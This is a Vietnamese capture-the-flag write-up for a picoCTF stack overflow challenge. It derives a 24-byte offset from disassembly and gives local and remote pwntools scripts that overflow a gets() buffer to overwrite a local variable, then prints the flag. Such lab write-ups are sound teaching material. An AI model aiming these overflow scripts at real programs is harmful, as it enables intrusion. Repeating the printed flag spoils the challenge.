# picoCTF Writeup — Stack Variable Overwrite

## Thông tin bài

- Nền tảng: picoCTF
- Dạng lỗi: Stack Buffer Overflow
- Mục tiêu: Ghi đè biến cục bộ `num` bằng cách nhập quá kích thước của `input`
- Flag:

```text
picoCTF{l0c4l5_1n_5c0p3_7bd3fee1}
```

---

## 1. Phân tích chương trình

Trong hàm `main`, chương trình có một vùng nhớ dùng để chứa dữ liệu nhập vào và một biến số nguyên `num`.

Đoạn assembly quan trọng:

```asm
0x0000000000401236 <+0>:     endbr64
0x000000000040123a <+4>:     push   rbp
0x000000000040123b <+5>:     mov    rbp,rsp
0x000000000040123e <+8>:     sub    rsp,0x20
0x0000000000401242 <+12>:    mov    DWORD PTR [rbp-0x8],0x40
0x0000000000401249 <+19>:    lea    rdi,[rip+0xdb4]
0x0000000000401250 <+26>:    mov    eax,0x0
0x0000000000401255 <+31>:    call   printf@plt
0x000000000040125a <+36>:    mov    rax,QWORD PTR [rip+0x2e0f]
0x0000000000401261 <+43>:    mov    rdi,rax
0x0000000000401264 <+46>:    call   fflush@plt
0x0000000000401269 <+51>:    lea    rax,[rbp-0x20]
0x000000000040126d <+55>:    mov    rdi,rax
0x0000000000401270 <+58>:    mov    eax,0x0
0x0000000000401275 <+63>:    call   gets@plt
```

---

## 2. Xác định vị trí các biến trên stack

### Biến `num`

Lệnh:

```asm
mov DWORD PTR [rbp-0x8],0x40
```

ghi giá trị `0x40` vào địa chỉ:

```text
rbp - 0x8
```

Vì vậy, biến `num` nằm tại:

```text
num = rbp - 0x8
```

Giá trị ban đầu của `num` là:

```text
0x40 = 64
```

### Biến `input`

Trước khi gọi `gets`, chương trình thực hiện:

```asm
lea rax,[rbp-0x20]
mov rdi,rax
call gets@plt
```

Theo quy ước gọi hàm trên kiến trúc x86-64, thanh ghi `rdi` chứa đối số thứ nhất.

Do đó lời gọi trên tương đương:

```c
gets((char *)(rbp - 0x20));
```

Vì vậy, đầu vùng nhớ của `input` nằm tại:

```text
input = rbp - 0x20
```

---

## 3. Tính khoảng cách từ `input` đến `num`

Ta có:

```text
input = rbp - 0x20
num   = rbp - 0x08
```

Khoảng cách giữa hai địa chỉ:

```text
(rbp - 0x08) - (rbp - 0x20)
= 0x20 - 0x08
= 0x18
= 24 byte
```

Vậy cần nhập đủ **24 byte** để đi từ đầu `input` đến ngay trước biến `num`.

Sơ đồ stack:

```text
Địa chỉ cao
+---------------------------+
| saved return address      |  rbp + 0x8
+---------------------------+
| saved rbp                 |  rbp
+---------------------------+
|                           |
| num                       |  rbp - 0x8
|                           |
+---------------------------+
| input                     |  rbp - 0x20
|                           |
+---------------------------+
Địa chỉ thấp
```

Dữ liệu được ghi vào mảng theo chiều địa chỉ tăng dần:

```text
input[0]  -> rbp - 0x20
input[1]  -> rbp - 0x1f
input[2]  -> rbp - 0x1e
...
input[23] -> rbp - 0x09
input[24] -> rbp - 0x08  (byte đầu tiên của num)
```

Do đó, khi nhập quá 24 byte, dữ liệu bắt đầu ghi đè lên biến `num`.

---

## 4. Nguyên nhân lỗ hổng

Chương trình sử dụng hàm:

```c
gets(input);
```

`gets()` không kiểm tra độ dài dữ liệu đầu vào. Người dùng có thể nhập nhiều byte hơn kích thước vùng nhớ dành cho `input`.

Khi đó xảy ra **stack buffer overflow**:

```text
input -> vùng đệm -> num
```

Ta không cần ghi đè địa chỉ trả về của hàm. Mục tiêu của bài chỉ là ghi đè một biến cục bộ nằm phía sau buffer trên stack.

---

## 5. Xây dựng payload

Payload có dạng:

```text
24 byte đệm + giá trị mới của num
```

Ví dụ kiểm tra bằng bốn ký tự `B`:

```python
payload = b"A" * 24 + b"BBBB"
```

Bốn ký tự `B` có mã ASCII là `0x42`, vì vậy `num` sẽ trở thành:

```text
0x42424242
```

Nếu chương trình yêu cầu `num` bằng một giá trị cụ thể, cần ghi giá trị đó theo thứ tự **little-endian**.

Ví dụ với pwntools:

```python
from pwn import *

payload = b"A" * 24
payload += p32(TARGET_VALUE)

print(payload)
```

Trong đó:

- `b"A" * 24` lấp đầy vùng từ `input` đến `num`.
- `p32(TARGET_VALUE)` đóng gói số nguyên 32-bit theo little-endian để ghi đè `num`.

---

## 6. Khai thác bằng pwntools

Mẫu script local:

```python
from pwn import *

context.binary = elf = ELF("./vuln", checksec=False)

p = process(elf.path)

offset = 24
target_value = 0x00000000  # Thay bằng giá trị mà chương trình yêu cầu

payload = flat(
    b"A" * offset,
    p32(target_value)
)

p.sendline(payload)
p.interactive()
```

Mẫu script remote:

```python
from pwn import *

context.binary = elf = ELF("./vuln", checksec=False)

HOST = "HOST"
PORT = 12345

p = remote(HOST, PORT)

offset = 24
target_value = 0x00000000  # Thay bằng giá trị mà chương trình yêu cầu

payload = flat(
    b"A" * offset,
    p32(target_value)
)

p.sendline(payload)
p.interactive()
```

---

## 7. Kết quả

Sau khi gửi đúng payload, biến `num` bị thay đổi thành giá trị mà chương trình yêu cầu và chương trình in ra flag:

```text
picoCTF{l0c4l5_1n_5c0p3_7bd3fee1}
```

---

## 8. Kiến thức rút ra

- Stack thường được cấp phát theo hướng từ địa chỉ cao xuống địa chỉ thấp.
- Các phần tử trong mảng được ghi theo chiều địa chỉ tăng dần.
- Thứ tự khai báo biến trong source C không đảm bảo tuyệt đối thứ tự của chúng trong stack frame.
- Cần xem assembly để xác định chính xác vị trí của từng biến.
- `[rbp-0x20]` là đầu `input` vì địa chỉ này được truyền vào `gets`.
- `[rbp-0x8]` là `num` vì chương trình ghi giá trị `0x40` vào đó.
- Khoảng cách từ `input` đến `num` là `0x18`, tức 24 byte.
- `gets()` là hàm nguy hiểm vì không giới hạn số byte nhập vào.
- Không phải mọi bài stack overflow đều cần ghi đè địa chỉ trả về; đôi khi chỉ cần thay đổi một biến cục bộ.
